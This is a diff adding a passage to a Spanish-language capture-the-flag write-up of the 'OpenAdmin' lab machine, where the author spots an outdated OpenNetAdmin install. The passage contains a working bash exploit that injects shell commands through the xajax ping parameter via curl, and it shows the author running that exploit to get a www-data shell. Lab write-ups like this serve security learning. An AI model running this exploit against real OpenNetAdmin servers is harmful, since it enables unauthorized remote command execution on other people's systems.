@@ -58,4 +58,30 @@ parece ser una pagina de apache comun, asi que mandaremos un burpsuite y un gobu
 >
 >> /sierra (Status: 301)
 
+al entrar a la primera, nos encontramos con uan pag bastante particular y bonita, probe altiro en la parte del login y me mando a una pag llamada ona, donde se puede ver que esta en uan version desactualizada asi que supongo que podria haber algun exploit o algo por internet.
 
+![](/TheusZero/images/post/OpenAdmin/OpenAdmin2.png)
+
+![](/TheusZero/images/post/OpenAdmin/OpenAdmin3.png)
+
+![](/TheusZero/images/post/OpenAdmin/OpenAdmin4.png)
+
+claramente, hay un exploit para esa version, sin embargo no la saque de esa pag, probe con otra, dejo aqui el exploit
+
+> Name.sh
+
+```vim
+#!/bin/bash
+
+URL="${1}"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
+```vim
+
+> sh rce.sh http://10.10.10.171/ona/
+
+listo, entre con una shell www-data
+
+q
